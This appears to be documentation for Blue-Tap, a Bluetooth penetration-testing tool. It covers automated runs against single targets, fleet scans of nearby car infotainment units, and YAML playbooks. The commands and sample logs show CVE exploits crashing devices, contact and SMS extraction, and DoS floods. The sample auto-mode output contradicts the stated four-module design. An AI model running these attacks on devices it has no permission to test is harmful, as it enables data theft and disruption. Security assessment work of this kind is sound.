# Automation

Blue-Tap offers three automation approaches, each suited to different situations.

| Approach | When to Use | Control Level |
|----------|-------------|---------------|
| **Auto mode** | Quick, comprehensive assessment of a single target | Low (fully automated) |
| **Fleet assessment** | Scanning multiple nearby devices | Low (automated discovery + vulnscan) |
| **Playbooks** | Repeatable, customized assessment workflows | High (you define each step) |

**Auto mode** is the "push one button" option. It runs every phase of an assessment in sequence, skipping what doesn't apply. Use it when you want comprehensive results fast and don't need fine-grained control over which modules run in which order.

**Fleet assessment** is for situations where you don't have a specific target --- you want to scan everything nearby and check for vulnerabilities. It discovers devices, filters by class, and runs vulnscan on each.

**Playbooks** are for repeatable, auditable workflows. When you need to run the exact same sequence of steps across multiple engagements (e.g., an IVI assessment checklist), define it once as a playbook and execute it consistently.

---

## Auto Mode

Runs a full assessment pipeline against a single target with minimal operator input.

```bash
blue-tap auto TARGET --hci hci0 --yes
```

### Phases

Auto mode is a **four-module shortcut** — not a full pentest. It runs exactly these modules in order and then writes an HTML report:

| Phase | Module | What it does |
|-------|--------|--------------|
| 1. Recon | `reconnaissance.sdp` | SDP service enumeration |
| 2. Vulnscan | `assessment.vuln_scanner` | Full vulnerability scan (CVE + posture checks) |
| 3. Exploit | `exploitation.knob` | KNOB key-negotiation attack (CVE-2019-9506) |
| 4. Extract | `post_exploitation.pbap` | Phonebook extraction |
| 5. Report | — | HTML report written to the session directory |

Skip any phase with `--skip <name>` (repeatable): `recon`, `vulnscan`, `exploit`, `extract`.

For broader workflows (dual-mode scanning, multiple exploits, DoS, fuzzing) use either the individual commands directly or a playbook via `run-playbook`.

### Example: Complete auto mode run

```
$ blue-tap auto AA:BB:CC:DD:EE:FF --hci hci0 --yes

══════════════════════════════════════════════════════════════
  BLUE-TAP AUTO ASSESSMENT
  Target: AA:BB:CC:DD:EE:FF
  Adapter: hci0
  Mode: Full (all phases, --yes confirmed)
══════════════════════════════════════════════════════════════

─── Phase 1: Discovery ───────────────────────────────────────
[14:30:01] Scanning for target AA:BB:CC:DD:EE:FF...
[14:30:03] Target found: "MyCarAudio" (RSSI: -42 dBm)
[14:30:03] Class of Device: Audio/Video - Car Audio (0x200424)
[14:30:03] Vendor: Harman International (OUI: AA:BB:CC)
[14:30:03] Phase 1 complete. Target reachable.

─── Phase 2: Fingerprint ────────────────────────────────────
[14:30:05] LMP version: 5.0 (Bluetooth 5.0)
[14:30:05] LMP subversion: 0x220e
[14:30:06] Manufacturer: Broadcom (ID: 15)
[14:30:06] Chipset: BCM4356 (inferred from subversion)
[14:30:06] Features: Encryption, EDR 2M/3M, SSP, LE
[14:30:06] Phase 2 complete.

─── Phase 3: Recon ──────────────────────────────────────────
[14:30:08] Starting deep service enumeration...
[14:30:12] SDP: 14 services discovered
[14:30:12]   PBAP (PSE), MAP (MAS), HFP (AG), A2DP (SNK)
[14:30:12]   AVRCP (TG), OPP, PAN-NAP, Serial Port (x2)
[14:30:12]   AVDTP, HID, PnP Information
[14:30:15] GATT: 3 services (GAP, GATT, Device Information)
[14:30:15] Phase 3 complete. 14 Classic + 3 BLE services.

─── Phase 4: Vulnscan ──────────────────────────────────────
[14:30:17] Running 52 vulnerability checks...
[14:31:45] Checks complete: 47 passed, 4 confirmed, 1 inconclusive
[14:31:45] Confirmed vulnerabilities:
[14:31:45]   CRITICAL  CVE-2020-0022   BlueFrag ACL reassembly
[14:31:45]   HIGH      CVE-2022-39177  AVDTP SETCONF overflow
[14:31:45]   HIGH      CVE-2025-0084   SDP race condition
[14:31:45]   MEDIUM    CVE-2020-26558  Method confusion (BLE)
[14:31:45] Phase 4 complete.

─── Phase 5: Pairing/Encryption ─────────────────────────────
[14:31:47] Attempting SSP pairing (JustWorks)...
[14:31:50] Pairing successful.
[14:31:50] Encryption: AES-CCM (128-bit)
[14:31:51] Key size: 16 bytes (maximum)
[14:31:51] MITM protection: No (JustWorks)
[14:31:51] Phase 5 complete.

─── Phase 6: Exploitation ──────────────────────────────────
[14:31:53] 4 exploits applicable based on vulnscan findings.
[14:31:53] Running exploit: CVE-2020-0022 (BlueFrag)...
[14:32:01] Result: success (target crashed, recovered after 22s)
[14:32:25] Running exploit: CVE-2022-39177 (AVDTP SETCONF)...
[14:32:28] Result: success (connection dropped)
[14:32:30] Running exploit: CVE-2025-0084 (SDP race)...
[14:32:35] Result: unresponsive (target did not recover)
[14:33:00] Waiting for target reboot...
[14:33:45] Target back online.
[14:33:47] Phase 6 complete. 3/4 exploits successful.

─── Phase 7: Fuzzing ───────────────────────────────────────
[14:33:49] Starting fuzzing campaign (protocols: sdp, l2cap)
[14:33:49] Strategy: coverage_guided, duration: 15m
[14:48:50] Campaign complete. 187,432 packets sent.
[14:48:50] Crashes: 2 (1 CRITICAL, 1 HIGH)
[14:48:50] Anomalies: 14
[14:48:50] Phase 7 complete.

─── Phase 8: DoS ───────────────────────────────────────────
[14:48:52] Running 18 applicable DoS checks...
[14:55:30] Results: 12 SUCCESS, 4 RECOVERED, 2 UNRESPONSIVE
[14:55:30] Phase 8 complete.

─── Phase 9: Report ────────────────────────────────────────
[14:55:32] Generating HTML report...
[14:55:34] Report saved: sessions/blue-tap_20260416_143001/report.html
[14:55:34] Phase 9 complete.

══════════════════════════════════════════════════════════════
  ASSESSMENT COMPLETE
  Duration: 25m 33s
  Risk rating: CRITICAL
  Vulnerabilities: 4 confirmed (1 CRITICAL, 2 HIGH, 1 MEDIUM)
  Fuzzing crashes: 2
  DoS findings: 2 UNRESPONSIVE
  Report: sessions/blue-tap_20260416_143001/report.html
══════════════════════════════════════════════════════════════
```

### Skipping Phases

```bash
blue-tap auto TARGET --skip recon,vulnscan,exploit,extract
```

Skippable phases: `recon`, `vulnscan`, `exploit`, `extract`

!!! tip "Non-Interactive"
    The `--yes` flag confirms all intrusive actions automatically. Without it, the operator is prompted before exploitation, fuzzing, and DoS phases. For unattended overnight runs, always include `--yes`.

!!! warning "Fuzzing and DoS Duration"
    In auto mode, fuzzing runs for a default duration (15 minutes) and DoS runs all applicable checks. For longer fuzzing campaigns, use a [playbook](#playbooks) where you can set `--duration 2h` or more.

---

## Fleet Assessment

Discovers nearby devices and runs vulnerability scanning across all matching targets.

```bash
blue-tap fleet --duration 10 --class ivi
```

### How It Works

1. Scans for nearby Bluetooth devices for `--duration` seconds
2. Filters discovered devices by `--class` (device class)
3. Runs `vulnscan` against each matching device sequentially
4. Aggregates results into a single report

### Example output

```
$ blue-tap fleet --duration 15 --class ivi

[14:00:01] Scanning for IVI devices (15s)...
[14:00:16] Found 3 IVI devices:
[14:00:16]   1. AA:BB:CC:DD:EE:FF  "MyCarAudio"      RSSI: -42
[14:00:16]   2. 11:22:33:44:55:66  "BMW iDrive"       RSSI: -58
[14:00:16]   3. 77:88:99:AA:BB:CC  "Infotainment-7"   RSSI: -71

─── Scanning 1/3: AA:BB:CC:DD:EE:FF ─────────────────────
[14:00:18] Running vulnscan (52 checks)...
[14:01:45] Done: 2 CRITICAL, 1 HIGH

─── Scanning 2/3: 11:22:33:44:55:66 ─────────────────────
[14:01:47] Running vulnscan (52 checks)...
[14:03:10] Done: 0 CRITICAL, 1 HIGH

─── Scanning 3/3: 77:88:99:AA:BB:CC ─────────────────────
[14:03:12] Running vulnscan (52 checks)...
[14:04:35] Done: 1 CRITICAL, 0 HIGH

═══════════════════════════════════════════════════════════
  Fleet Summary: 3 devices scanned
  AA:BB:CC:DD:EE:FF  CRITICAL (2 CRIT, 1 HIGH)
  11:22:33:44:55:66  HIGH (0 CRIT, 1 HIGH)
  77:88:99:AA:BB:CC  CRITICAL (1 CRIT, 0 HIGH)
═══════════════════════════════════════════════════════════
```

### Device Classes

| Class | Matches |
|-------|---------|
| `ivi` | In-Vehicle Infotainment (CoD major `Audio/Video`, minor `Car Audio`) |
| `phone` | Mobile phones |
| `headset` | Bluetooth headsets and earbuds |
| `speaker` | Bluetooth speakers |
| `laptop` | Laptops and notebooks |
| `keyboard` | HID keyboards |
| `mouse` | HID mice |

---

## Playbooks

Playbooks define reusable sequences of Blue-Tap commands. They support YAML format, plain-text format, and inline command lists.

### When to Use Playbooks

- **Repeatable assessments**: Run the same sequence across multiple engagements. A "standard IVI assessment" playbook ensures consistent coverage.
- **Compliance checklists**: Map assessment steps to compliance requirements. Each step can have a description that ties to a specific control.
- **Team standardization**: Share playbooks across team members so everyone runs the same checks in the same order.
- **Complex workflows**: Chain steps that depend on each other (e.g., extract contacts, then fuzz the PBAP parser with the extracted data as seeds).

### YAML Format

```yaml
name: ivi-full-assessment
description: Complete IVI assessment with extraction and fuzzing
duration: 45m
risk: high
steps:
  - command: "discover classic -d 15"
    description: "Find nearby Classic Bluetooth devices"
  - command: "recon {target} auto"
    description: "Deep reconnaissance on target"
  - command: "vulnscan {target}"
    description: "Run vulnerability checks"
  - command: "extract {target} contacts --all"
    description: "Extract all phonebooks via PBAP"
  - command: "extract {target} messages --folder inbox"
    description: "Extract SMS inbox via MAP"
  - command: "dos {target} --checks l2ping_flood,pair_flood --yes"
    description: "DoS resilience testing"
  - command: "fuzz campaign {target} -p sdp -p rfcomm --duration 30m"
    description: "Protocol fuzzing campaign"
  - command: "report --format html"
    description: "Generate final report"
```

!!! note "Placeholder substitution"
    Playbook commands are rewritten before execution: every occurrence of
    literal `TARGET` **or** `{target}` is replaced with the resolved target
    address. Earlier builds also rewrote the lowercase word `target`, which
    corrupted command strings that contained the literal word (e.g. a
    description string or option value). If you have older playbooks that
    relied on that behavior, switch to `{target}` or `TARGET`.

### What the playbook produces

```
$ blue-tap run-playbook --playbook ivi-full-assessment.yaml

══════════════════════════════════════════════════════════════
  PLAYBOOK: ivi-full-assessment
  Description: Complete IVI assessment with extraction and fuzzing
  Duration estimate: 45m
  Risk level: high
  Steps: 8
══════════════════════════════════════════════════════════════

─── Step 1/8: Find nearby Classic Bluetooth devices ─────────
  > discover classic -d 15
[14:30:01] Scanning... found 2 devices.
[14:30:16] Done.

─── Step 2/8: Deep reconnaissance on target ─────────────────
  > recon auto AA:BB:CC:DD:EE:FF
[14:30:18] Starting deep service enumeration...
[14:32:45] Done. 14 services found.

─── Step 3/8: Run vulnerability checks ──────────────────────
  > vulnscan AA:BB:CC:DD:EE:FF
[14:32:47] Running 52 checks...
[14:34:20] Done. 4 vulnerabilities confirmed.

─── Step 4/8: Extract all phonebooks via PBAP ───────────────
  > extract AA:BB:CC:DD:EE:FF contacts --all
[14:34:22] Connecting PBAP...
[14:34:30] Done. 847 contacts extracted.

─── Step 5/8: Extract SMS inbox via MAP ─────────────────────
  > extract AA:BB:CC:DD:EE:FF messages --folder inbox
[14:34:32] Connecting MAP...
[14:34:40] Done. 1,847 messages retrieved.

─── Step 6/8: DoS resilience testing ────────────────────────
  > [module: exploitation.dos] target=AA:BB:CC:DD:EE:FF
    checks=l2ping_flood,pair_flood
[14:34:42] Running 2 DoS checks...
[14:35:10] Done. 1 SUCCESS, 1 RECOVERED.

─── Step 7/8: Protocol fuzzing campaign ─────────────────────
  > fuzz campaign AA:BB:CC:DD:EE:FF -p sdp -p rfcomm
    --duration 30m
[14:35:12] Starting fuzzing campaign...
[15:05:13] Done. 2 crashes found.

─── Step 8/8: Generate final report ─────────────────────────
  > report --format html
[15:05:15] Generating report...
[15:05:17] Saved: report.html

══════════════════════════════════════════════════════════════
  PLAYBOOK COMPLETE
  Duration: 35m 16s
  All 8 steps executed successfully.
══════════════════════════════════════════════════════════════
```

### Plain-Text Format

One command per line:

```
discover classic -d 15
recon auto TARGET
vulnscan TARGET
extract TARGET contacts --all
fuzz campaign TARGET -p sdp --duration 15m
report --format html
```

### Placeholders

| Placeholder | Resolved To |
|-------------|-------------|
| `{target}` / `TARGET` | Target device address |
| `{hci}` | HCI adapter (e.g., `hci0`) |

### Running Playbooks

```bash
# Inline commands
blue-tap run-playbook "discover classic" "vulnscan TARGET"

# From a YAML file
blue-tap run-playbook --playbook path/to/assessment.yaml

# Bundled playbook by name
blue-tap run-playbook --playbook quick-recon

# List available bundled playbooks
blue-tap run-playbook --list
```

### Module-to-CLI Mapping

When using the `module` key in YAML steps, the following mapping applies:

| Module ID | CLI Command |
|-----------|-------------|
| `assessment.vuln_scanner` | `vulnscan` |
| `assessment.fleet` | `fleet` |
| `reconnaissance.campaign` | `recon auto` |
| `discovery.scanner` | `scan all` |

!!! info "Module vs Command Steps"
    Use `command` for standard CLI invocations. Use `module` when you need to pass structured arguments directly to a registered module, bypassing CLI argument parsing.

---

## Building Your First Playbook

A step-by-step walkthrough for creating a custom playbook.

### 1. Define the goal

Decide what the playbook should accomplish. For this example: a quick recon-and-vulnscan for a new target, with no intrusive actions.

### 2. Create the YAML file

```yaml
name: quick-assessment
description: Non-intrusive recon and vulnerability scan
duration: 10m
risk: low
steps:
  - command: "discover classic -d 10"
    description: "Scan for nearby Classic devices"
  - command: "recon auto {target}"
    description: "Enumerate services and profiles"
  - command: "vulnscan {target}"
    description: "Run vulnerability checks"
  - command: "report --format html"
    description: "Generate report"
```

### 3. Test it

```bash
blue-tap run-playbook --playbook quick-assessment.yaml
```

### 4. Iterate

Add steps, adjust durations, and refine based on results. Common additions:

```yaml
# Add extraction (requires pairing)
  - command: "extract {target} contacts --all"
    description: "Extract contacts if paired"

# Add targeted fuzzing
  - command: "fuzz campaign {target} -p sdp --duration 15m --strategy coverage_guided"
    description: "Fuzz SDP for 15 minutes"

# Add specific DoS checks (intrusive)
  - module: "exploitation.dos"
    args:
      target: "{target}"
      checks: "dos_sdp_des_bomb,dos_l2cap_cid_exhaust"
    description: "Targeted DoS checks"
```

### 5. Share and reuse

Save playbooks in a shared directory or version control. Use `--playbook` with a path to run them from anywhere:

```bash
blue-tap run-playbook --playbook ~/playbooks/ivi-standard.yaml
```

!!! tip "Playbook Library"
    Build a library of playbooks for different engagement types: `ivi-standard.yaml`, `phone-quick.yaml`, `headset-minimal.yaml`, `ble-device-full.yaml`. Over time, this becomes your team's standardized assessment methodology.

---

## Next Steps

- **Session management**: Understand how automation results are stored in [sessions](sessions-and-reporting.md).
- **Fuzzing campaigns**: For detailed fuzzing configuration, see the [Fuzzing guide](fuzzing.md).
- **Custom workflows**: See the [Custom Playbooks workflow](../workflows/custom-playbooks.md) for advanced playbook patterns.
- **CLI reference**: Full command and flag documentation in the [CLI Reference](cli-reference.md).
